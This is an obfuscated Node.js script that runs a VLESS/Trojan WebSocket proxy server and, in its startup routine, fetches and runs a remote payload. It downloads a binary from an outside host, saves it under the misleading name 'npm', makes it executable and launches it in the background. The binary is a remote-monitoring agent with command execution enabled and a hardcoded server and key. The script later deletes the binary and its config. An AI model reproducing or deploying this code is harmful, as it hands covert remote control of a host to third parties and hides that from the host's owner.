const _0x2ff9fa=_0x9654;(function(_0x178566,_0x4f7d8f){const _0x2c0678=_0x9654,_0x4df9dc=_0x178566();while(!![]){try{const _0x33f2e9=-parseInt(_0x2c0678(0x1ff))/0x1+parseInt(_0x2c0678(0x22f))/0x2+-parseInt(_0x2c0678(0x1fb))/0x3+-parseInt(_0x2c0678(0x251))/0x4*(parseInt(_0x2c0678(0x1f7))/0x5)+parseInt(_0x2c0678(0x246))/0x6+-parseInt(_0x2c0678(0x23a))/0x7*(-parseInt(_0x2c0678(0x21d))/0x8)+parseInt(_0x2c0678(0x24f))/0x9;if(_0x33f2e9===_0x4f7d8f)break;else _0x4df9dc['push'](_0x4df9dc['shift']());}catch(_0x3aa4d7){_0x4df9dc['push'](_0x4df9dc['shift']());}}}(_0x3183,0xe9e9c));const os=require('os'),http=require(_0x2ff9fa(0x1f9)),fs=require('fs'),axios=require(_0x2ff9fa(0x1eb)),net=require(_0x2ff9fa(0x1fd)),path=require(_0x2ff9fa(0x248)),crypto=require(_0x2ff9fa(0x209)),{Buffer}=require(_0x2ff9fa(0x1f3)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2ff9fa(0x23e)][_0x2ff9fa(0x21f)]||_0x2ff9fa(0x22a),NEZHA_SERVER=process['env'][_0x2ff9fa(0x249)]||_0x2ff9fa(0x229),NEZHA_PORT=process[_0x2ff9fa(0x23e)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x2ff9fa(0x1e4)]||'B2sap6Iikb2uYq34PuItEWys9LA7Tnvd',DOMAIN=process[_0x2ff9fa(0x23e)][_0x2ff9fa(0x1ee)]||_0x2ff9fa(0x1f2),AUTO_ACCESS=process[_0x2ff9fa(0x23e)]['AUTO_ACCESS']||!![],WSPATH=process[_0x2ff9fa(0x23e)]['WSPATH']||UUID[_0x2ff9fa(0x1f1)](0x0,0x8),SUB_PATH=process[_0x2ff9fa(0x23e)]['SUB_PATH']||_0x2ff9fa(0x205),NAME=process['env'][_0x2ff9fa(0x21b)]||_0x2ff9fa(0x1e7),PORT=process[_0x2ff9fa(0x23e)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3aa58c=_0x2ff9fa;try{const _0x212260=await axios[_0x3aa58c(0x201)](_0x3aa58c(0x245)),_0x684b97=_0x212260[_0x3aa58c(0x220)];ISP=(_0x684b97[_0x3aa58c(0x23d)]+'-'+_0x684b97['asOrganization'])['replace'](/ /g,'_');}catch(_0x41555f){ISP=_0x3aa58c(0x234);}};GetISP();const httpServer=http['createServer']((_0x4afcc4,_0x475ec0)=>{const _0x583fae=_0x2ff9fa;if(_0x4afcc4[_0x583fae(0x1f6)]==='/'){const _0x38bf39=path['join'](__dirname,'index.html');fs[_0x583fae(0x257)](_0x38bf39,_0x583fae(0x24c),(_0x29c3b3,_0xc0f888)=>{const _0x4276bf=_0x583fae;if(_0x29c3b3){_0x475ec0[_0x4276bf(0x211)](0xc8,{'Content-Type':'text/html'}),_0x475ec0[_0x4276bf(0x240)]('Hello\x20world!');return;}_0x475ec0[_0x4276bf(0x211)](0xc8,{'Content-Type':_0x4276bf(0x222)}),_0x475ec0[_0x4276bf(0x240)](_0xc0f888);});return;}else{if(_0x4afcc4[_0x583fae(0x1f6)]==='/'+SUB_PATH){const _0x391752='vless://'+UUID+'@'+DOMAIN+_0x583fae(0x1f4)+DOMAIN+_0x583fae(0x24b)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x1098dc=_0x583fae(0x236)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x583fae(0x24b)+DOMAIN+_0x583fae(0x1f5)+WSPATH+'#'+NAME+'-'+ISP,_0x40da87=_0x391752+'\x0a'+_0x1098dc,_0x2a177b=Buffer[_0x583fae(0x202)](_0x40da87)[_0x583fae(0x218)](_0x583fae(0x24d));_0x475ec0[_0x583fae(0x211)](0xc8,{'Content-Type':'text/plain'}),_0x475ec0[_0x583fae(0x240)](_0x2a177b+'\x0a');}else _0x475ec0[_0x583fae(0x211)](0x194,{'Content-Type':'text/plain'}),_0x475ec0['end'](_0x583fae(0x252));}}),wss=new WebSocket[(_0x2ff9fa(0x230))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x2ff9fa(0x241)];function resolveHost(_0x4135a0){return new Promise((_0x4cd790,_0x5095a2)=>{const _0xa4536b=_0x9654;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xa4536b(0x244)](_0x4135a0)){_0x4cd790(_0x4135a0);return;}let _0x152143=0x0;function _0x51b13c(){const _0x396407=_0xa4536b;if(_0x152143>=DNS_SERVERS[_0x396407(0x233)]){_0x5095a2(new Error(_0x396407(0x215)+_0x4135a0+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x18e724=DNS_SERVERS[_0x152143];_0x152143++;const _0x3293d3='https://dns.google/resolve?name='+encodeURIComponent(_0x4135a0)+'&type=A';axios[_0x396407(0x201)](_0x3293d3,{'timeout':0x1388,'headers':{'Accept':_0x396407(0x219)}})[_0x396407(0x21c)](_0x22c418=>{const _0x5ad692=_0x396407,_0x42ad7a=_0x22c418[_0x5ad692(0x220)];if(_0x42ad7a['Status']===0x0&&_0x42ad7a[_0x5ad692(0x23c)]&&_0x42ad7a[_0x5ad692(0x23c)][_0x5ad692(0x233)]>0x0){const _0x136de3=_0x42ad7a[_0x5ad692(0x23c)][_0x5ad692(0x1e6)](_0x3428d0=>_0x3428d0[_0x5ad692(0x217)]===0x1);if(_0x136de3){_0x4cd790(_0x136de3[_0x5ad692(0x220)]);return;}}_0x51b13c();})[_0x396407(0x1e3)](_0xf081f7=>{_0x51b13c();});}_0x51b13c();});}function handleVlessConnection(_0x62ca8f,_0x4a47e3){const _0x3c1ca0=_0x2ff9fa,[_0x3b9380]=_0x4a47e3,_0x2b3d0b=_0x4a47e3[_0x3c1ca0(0x1f1)](0x1,0x11);if(!_0x2b3d0b['every']((_0x53fb31,_0x1dd7bf)=>_0x53fb31==parseInt(uuid[_0x3c1ca0(0x210)](_0x1dd7bf*0x2,0x2),0x10)))return![];let _0x80b4dd=_0x4a47e3[_0x3c1ca0(0x1f1)](0x11,0x12)[_0x3c1ca0(0x223)]()+0x13;const _0xe58a9b=_0x4a47e3['slice'](_0x80b4dd,_0x80b4dd+=0x2)[_0x3c1ca0(0x20e)](0x0),_0x4a9d45=_0x4a47e3['slice'](_0x80b4dd,_0x80b4dd+=0x1)[_0x3c1ca0(0x223)](),_0x178fdd=_0x4a9d45==0x1?_0x4a47e3[_0x3c1ca0(0x1f1)](_0x80b4dd,_0x80b4dd+=0x4)[_0x3c1ca0(0x22c)]('.'):_0x4a9d45==0x2?new TextDecoder()[_0x3c1ca0(0x259)](_0x4a47e3['slice'](_0x80b4dd+0x1,_0x80b4dd+=0x1+_0x4a47e3[_0x3c1ca0(0x1f1)](_0x80b4dd,_0x80b4dd+0x1)[_0x3c1ca0(0x223)]())):_0x4a9d45==0x3?_0x4a47e3[_0x3c1ca0(0x1f1)](_0x80b4dd,_0x80b4dd+=0x10)[_0x3c1ca0(0x250)]((_0x172a7d,_0x4ebce6,_0x4021bd,_0x286c55)=>_0x4021bd%0x2?_0x172a7d[_0x3c1ca0(0x221)](_0x286c55[_0x3c1ca0(0x1f1)](_0x4021bd-0x1,_0x4021bd+0x1)):_0x172a7d,[])[_0x3c1ca0(0x258)](_0x24277b=>_0x24277b[_0x3c1ca0(0x20e)](0x0)[_0x3c1ca0(0x218)](0x10))['join'](':'):'';_0x62ca8f[_0x3c1ca0(0x237)](new Uint8Array([_0x3b9380,0x0]));const _0x619306=createWebSocketStream(_0x62ca8f);return resolveHost(_0x178fdd)[_0x3c1ca0(0x21c)](_0x238438=>{const _0x2b2b21=_0x3c1ca0;net['connect']({'host':_0x238438,'port':_0xe58a9b},function(){const _0x4172fe=_0x9654;this[_0x4172fe(0x1e9)](_0x4a47e3[_0x4172fe(0x1f1)](_0x80b4dd)),_0x619306['on'](_0x4172fe(0x204),()=>{})[_0x4172fe(0x21e)](this)['on'](_0x4172fe(0x204),()=>{})[_0x4172fe(0x21e)](_0x619306);})['on'](_0x2b2b21(0x204),()=>{});})[_0x3c1ca0(0x1e3)](_0x12c2cc=>{net['connect']({'host':_0x178fdd,'port':_0xe58a9b},function(){const _0x50cb34=_0x9654;this[_0x50cb34(0x1e9)](_0x4a47e3[_0x50cb34(0x1f1)](_0x80b4dd)),_0x619306['on'](_0x50cb34(0x204),()=>{})[_0x50cb34(0x21e)](this)['on'](_0x50cb34(0x204),()=>{})[_0x50cb34(0x21e)](_0x619306);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x577dd5,_0x35046b){const _0x42740e=_0x2ff9fa;try{if(_0x35046b[_0x42740e(0x233)]<0x3a)return![];const _0x5f0ad4=_0x35046b[_0x42740e(0x1f1)](0x0,0x38)[_0x42740e(0x218)](),_0x51e142=[UUID];let _0x26ff7d=null;for(const _0x440027 of _0x51e142){const _0x165db6=crypto['createHash'](_0x42740e(0x203))[_0x42740e(0x226)](_0x440027)[_0x42740e(0x1fc)](_0x42740e(0x256));if(_0x165db6===_0x5f0ad4){_0x26ff7d=_0x440027;break;}}if(!_0x26ff7d)return![];let _0x1a1492=0x38;_0x35046b[_0x1a1492]===0xd&&_0x35046b[_0x1a1492+0x1]===0xa&&(_0x1a1492+=0x2);const _0x21557b=_0x35046b[_0x1a1492];if(_0x21557b!==0x1)return![];_0x1a1492+=0x1;const _0x29265b=_0x35046b[_0x1a1492];_0x1a1492+=0x1;let _0x1b7716,_0x5bbc47;if(_0x29265b===0x1)_0x1b7716=_0x35046b[_0x42740e(0x1f1)](_0x1a1492,_0x1a1492+0x4)[_0x42740e(0x22c)]('.'),_0x1a1492+=0x4;else{if(_0x29265b===0x3){const _0x12edf2=_0x35046b[_0x1a1492];_0x1a1492+=0x1,_0x1b7716=_0x35046b[_0x42740e(0x1f1)](_0x1a1492,_0x1a1492+_0x12edf2)[_0x42740e(0x218)](),_0x1a1492+=_0x12edf2;}else{if(_0x29265b===0x4)_0x1b7716=_0x35046b[_0x42740e(0x1f1)](_0x1a1492,_0x1a1492+0x10)[_0x42740e(0x250)]((_0x927cd1,_0xa8b0d7,_0x33c7ce,_0x5860f8)=>_0x33c7ce%0x2?_0x927cd1[_0x42740e(0x221)](_0x5860f8[_0x42740e(0x1f1)](_0x33c7ce-0x1,_0x33c7ce+0x1)):_0x927cd1,[])[_0x42740e(0x258)](_0x19c732=>_0x19c732[_0x42740e(0x20e)](0x0)[_0x42740e(0x218)](0x10))[_0x42740e(0x22c)](':'),_0x1a1492+=0x10;else return![];}}_0x5bbc47=_0x35046b[_0x42740e(0x20e)](_0x1a1492),_0x1a1492+=0x2;_0x1a1492<_0x35046b['length']&&_0x35046b[_0x1a1492]===0xd&&_0x35046b[_0x1a1492+0x1]===0xa&&(_0x1a1492+=0x2);const _0x2bb69c=createWebSocketStream(_0x577dd5);return resolveHost(_0x1b7716)[_0x42740e(0x21c)](_0x224b12=>{net['connect']({'host':_0x224b12,'port':_0x5bbc47},function(){const _0x57338c=_0x9654;_0x1a1492<_0x35046b[_0x57338c(0x233)]&&this[_0x57338c(0x1e9)](_0x35046b[_0x57338c(0x1f1)](_0x1a1492)),_0x2bb69c['on'](_0x57338c(0x204),()=>{})['pipe'](this)['on'](_0x57338c(0x204),()=>{})[_0x57338c(0x21e)](_0x2bb69c);})['on']('error',()=>{});})[_0x42740e(0x1e3)](_0x21582d=>{const _0x2faa3e=_0x42740e;net[_0x2faa3e(0x23b)]({'host':_0x1b7716,'port':_0x5bbc47},function(){const _0x47507c=_0x2faa3e;_0x1a1492<_0x35046b[_0x47507c(0x233)]&&this[_0x47507c(0x1e9)](_0x35046b[_0x47507c(0x1f1)](_0x1a1492)),_0x2bb69c['on'](_0x47507c(0x204),()=>{})[_0x47507c(0x21e)](this)['on'](_0x47507c(0x204),()=>{})[_0x47507c(0x21e)](_0x2bb69c);})['on']('error',()=>{});}),!![];}catch(_0x37c806){return![];}}function _0x9654(_0x5b20e6,_0x503834){const _0x318380=_0x3183();return _0x9654=function(_0x96549f,_0x283892){_0x96549f=_0x96549f-0x1e2;let _0xb8d860=_0x318380[_0x96549f];return _0xb8d860;},_0x9654(_0x5b20e6,_0x503834);}wss['on'](_0x2ff9fa(0x1f8),(_0x1391f6,_0x52afe5)=>{const _0x13ed03=_0x2ff9fa,_0x43ebea=_0x52afe5[_0x13ed03(0x1f6)]||'';_0x1391f6['once'](_0x13ed03(0x20a),_0x289bea=>{const _0x40b590=_0x13ed03;if(_0x289bea[_0x40b590(0x233)]>0x11&&_0x289bea[0x0]===0x0){const _0xc9ab59=_0x289bea[_0x40b590(0x1f1)](0x1,0x11),_0x1d2845=_0xc9ab59['every']((_0x51aca6,_0x4d1ace)=>_0x51aca6==parseInt(uuid[_0x40b590(0x210)](_0x4d1ace*0x2,0x2),0x10));if(_0x1d2845){!handleVlessConnection(_0x1391f6,_0x289bea)&&_0x1391f6[_0x40b590(0x20f)]();return;}}!handleTrojanConnection(_0x1391f6,_0x289bea)&&_0x1391f6[_0x40b590(0x20f)]();})['on']('error',()=>{});});function _0x3183(){const _0x2668bd=['env','chmod\x20+x\x20npm','end','1.1.1.1','setsid\x20nohup\x20./npm\x20-s\x20','arm64','test','https://speed.cloudflare.com/meta','1297950EpACSm','npm\x20is\x20already\x20running,\x20skip\x20running...','path','NEZHA_SERVER','2083','&fp=chrome&type=ws&host=','utf8','base64','--tls','17263044zNDzUX','reduce','332JqfAkp','Not\x20Found\x0a','npm\x20download\x20successfully','false','utf-8','hex','readFile','map','decode','aarch64','2053','split','catch','NEZHA_KEY','\x20-p\x20','find','Hug','true','write','post','axios','Server\x20is\x20running\x20on\x20port\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','DOMAIN','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','npm\x20running\x20error:','slice','1234.abc.com','buffer',':443?encryption=none&security=tls&sni=','&path=%2F','url','68630sAkCOO','connection','http','client_secret:\x20','877686RFNxcZ','digest','net','npm\x20is\x20running','1388508mlZoOE','https://oooo.serv00.net/add-url','get','from','sha224','error','diao88','createWriteStream','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm','crypto','message','/bin/bash','https://arm64.ssss.nyc.mn/agent','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','readUInt16BE','close','substr','writeHead','2087','config.yaml','unlink','Failed\x20to\x20resolve\x20','Automatic\x20Access\x20Task\x20added\x20successfully','type','toString','application/dns-json','https://','NAME','then','3070664ChGilt','pipe','UUID','data','concat','text/html','readUInt8','https://arm64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/agent','update','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','finish','nezha1.ppvv.eu.org:29123','8a053633-4da9-40fa-85ef-a28fdb5ab2f1','log','join','includes','arm','2520324vLWave','Server','trim','2096','length','Unknown','application/json','trojan://','send','stream','https://amd64.ssss.nyc.mn/v1','7bSHuRQ','connect','Answer','country'];_0x3183=function(){return _0x2668bd;};return _0x3183();}const getDownloadUrl=()=>{const _0x43ee80=_0x2ff9fa,_0x5ac98d=os['arch']();return _0x5ac98d===_0x43ee80(0x22e)||_0x5ac98d===_0x43ee80(0x243)||_0x5ac98d===_0x43ee80(0x25a)?!NEZHA_PORT?_0x43ee80(0x224):_0x43ee80(0x20c):!NEZHA_PORT?_0x43ee80(0x239):_0x43ee80(0x225);},downloadFile=async()=>{const _0x5d31f9=_0x2ff9fa;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x12ba07=getDownloadUrl(),_0x7f75bf=await axios({'method':_0x5d31f9(0x201),'url':_0x12ba07,'responseType':_0x5d31f9(0x238)}),_0x46bc18=fs[_0x5d31f9(0x206)](_0x5d31f9(0x208));return _0x7f75bf[_0x5d31f9(0x220)][_0x5d31f9(0x21e)](_0x46bc18),new Promise((_0x330f62,_0x4dc162)=>{const _0x290a48=_0x5d31f9;_0x46bc18['on'](_0x290a48(0x228),()=>{const _0x39148c=_0x290a48;console[_0x39148c(0x22b)](_0x39148c(0x253)),exec(_0x39148c(0x23f),_0x1cafeb=>{if(_0x1cafeb)_0x4dc162(_0x1cafeb);_0x330f62();});}),_0x46bc18['on'](_0x290a48(0x204),_0x4dc162);});}catch(_0x1459fa){throw _0x1459fa;}},runnz=async()=>{const _0x34e0f9=_0x2ff9fa;try{const _0xbe2cb5=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x34e0f9(0x255)});if(_0xbe2cb5[_0x34e0f9(0x231)]()!==''){console[_0x34e0f9(0x22b)](_0x34e0f9(0x247));return;}}catch(_0x38f88b){}await downloadFile();let _0x39ab0a='',_0x3f380a=['443','8443',_0x34e0f9(0x232),_0x34e0f9(0x212),_0x34e0f9(0x24a),_0x34e0f9(0x25b)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5f4945=_0x3f380a[_0x34e0f9(0x22d)](NEZHA_PORT)?_0x34e0f9(0x24e):'';_0x39ab0a=_0x34e0f9(0x242)+NEZHA_SERVER+':'+NEZHA_PORT+_0x34e0f9(0x1e5)+NEZHA_KEY+'\x20'+_0x5f4945+_0x34e0f9(0x20d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xb2ebd3=NEZHA_SERVER[_0x34e0f9(0x22d)](':')?NEZHA_SERVER[_0x34e0f9(0x1e2)](':')['pop']():'',_0x4a1ac0=_0x3f380a[_0x34e0f9(0x22d)](_0xb2ebd3)?_0x34e0f9(0x1e8):_0x34e0f9(0x254),_0x24b02b=_0x34e0f9(0x1fa)+NEZHA_KEY+_0x34e0f9(0x227)+NEZHA_SERVER+_0x34e0f9(0x1ed)+_0x4a1ac0+_0x34e0f9(0x207)+UUID;fs['writeFileSync']('config.yaml',_0x24b02b);}_0x39ab0a=_0x34e0f9(0x1ef);}else{console[_0x34e0f9(0x22b)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x39ab0a,{'shell':_0x34e0f9(0x20b)},_0x5c3735=>{const _0x2de00a=_0x34e0f9;if(_0x5c3735)console[_0x2de00a(0x204)](_0x2de00a(0x1f0),_0x5c3735);else console['log'](_0x2de00a(0x1fe));});}catch(_0x28a502){console[_0x34e0f9(0x204)]('error:\x20'+_0x28a502);}};async function addAccessTask(){const _0xcb1fb7=_0x2ff9fa;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5570c6=_0xcb1fb7(0x21a)+DOMAIN+'/'+SUB_PATH;try{const _0x3ee088=await axios[_0xcb1fb7(0x1ea)](_0xcb1fb7(0x200),{'url':_0x5570c6},{'headers':{'Content-Type':_0xcb1fb7(0x235)}});console[_0xcb1fb7(0x22b)](_0xcb1fb7(0x216));}catch(_0x23c256){}}const delFiles=()=>{const _0x3863ac=_0x2ff9fa;fs[_0x3863ac(0x214)](_0x3863ac(0x208),()=>{}),fs[_0x3863ac(0x214)](_0x3863ac(0x213),()=>{});};httpServer['listen'](PORT,()=>{const _0x4f09a4=_0x2ff9fa;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4f09a4(0x22b)](_0x4f09a4(0x1ec)+PORT);});